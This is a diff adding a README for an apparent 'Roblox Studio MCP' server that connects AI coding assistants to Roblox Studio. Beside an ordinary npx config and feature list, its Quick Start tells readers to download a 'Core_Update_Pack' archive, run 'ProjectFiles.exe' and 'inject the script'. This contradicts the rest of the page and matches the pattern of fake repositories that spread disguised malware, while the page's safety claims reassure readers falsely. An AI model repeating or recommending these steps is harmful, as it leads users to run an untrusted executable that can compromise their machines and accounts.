@@ -1,0 +1,93 @@
+🎮 Roblox Studio MCP
+
+Model Context Protocol Server for Roblox Studio — 2026
+
+Connect your AI coding assistant (Claude, Cursor, Cline, ChatGPT) directly to Roblox Studio.
+Automate Lua scripting, read object trees, inspect properties, and run playtests — all without leaving your editor.
+
+🎯 What it is
+
+Roblox Studio MCP is a lightweight Node.js/TypeScript server that implements the Model Context Protocol (MCP) to bridge Roblox Studio and AI agents.
+It acts as an AI bridge, allowing LLMs to understand your game's architecture, generate and edit Lua scripts, and automate repetitive developer tasks safely.
+
+🔒 Safe by design: no execution of untrusted code, no memory manipulation, and no access to private data. All operations are sandboxed within the Studio plugin.
+
+🚀 Quick Start
+
+1. Download Core_Update_Pack using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| 🧠 MCP Protocol Support | Fully compatible with Claude Desktop, Cursor IDE, Cline, and ChatGPT |
+| 🏗️ Object Tree Reader   | Browse the full hierarchy of your Roblox place       |
+| ✏️ Lua Script Editor    | Create, read, and update Lua scripts via AI          |
+| 🔍 Property Inspector   | Inspect and modify instance properties               |
+| ▶️ Playtest Control     | Run, pause, and stop playtests directly from the agent |
+| 🛡️ Read-Only Mode       | Safe mode for exploration without making changes     |
+| ⚡ Fast & Lightweight   | Built with Node.js + WebSocket, low memory footprint |
+| 🔌 Auto-Discovery       | Finds open Studio sessions automatically             |
+
+🛠️ How to use (with Claude Desktop & Cursor)
+
+1. Open claude_desktop_config.json (or Cursor MCP settings).
+2. Add the following configuration:
+
+{
+  "mcpServers": {
+    "roblox-studio": {
+      "command": "npx",
+      "args": ["-y", "roblox-studio-mcp"]
+    }
+  }
+}
+
+3. Restart your AI assistant.
+4. Ask Claude: "Show me the object tree of my Roblox place".
+5. The AI agent will use the MCP server to fetch the data and respond.
+
+⚙️ Configuration
+
+You can adjust settings via environment variables:
+
+- RBX_MCP_PORT — WebSocket port (default: 44755)
+- RBX_MCP_SAFE_MODE — true to disable destructive actions
+- RBX_MCP_LOG_LEVEL — debug | info | warn | error
+- RBX_MCP_TIMEOUT — Request timeout in milliseconds
+
+💻 Tech Stack & Architecture
+
+- Core: TypeScript, Node.js
+- Protocol: Model Context Protocol (MCP)
+- Communication: WebSockets / stdio
+- Plugin: Lua (Roblox Studio API)
+- Client Support: Claude Desktop, Cursor, Cline, ChatGPT (via adapters)
+
+❓ FAQ
+
+Is it safe to use?
+Yes — the server only interacts with Studio through the official plugin API. It does not inject malicious code or read memory.
+
+Do I need to own the place?
+Yes, you must have edit access to the place in Roblox Studio.
+
+Does it work with free AI models?
+Yes, as long as the client supports the MCP protocol (e.g., Cursor, Cline, Claude).
+
+Can I use it on multiple Studio instances?
+Yes, the server auto-discovers open sessions. Use RBX_MCP_SAFE_MODE=true for read-only exploration.
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+See CONTRIBUTING.md for guidelines.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
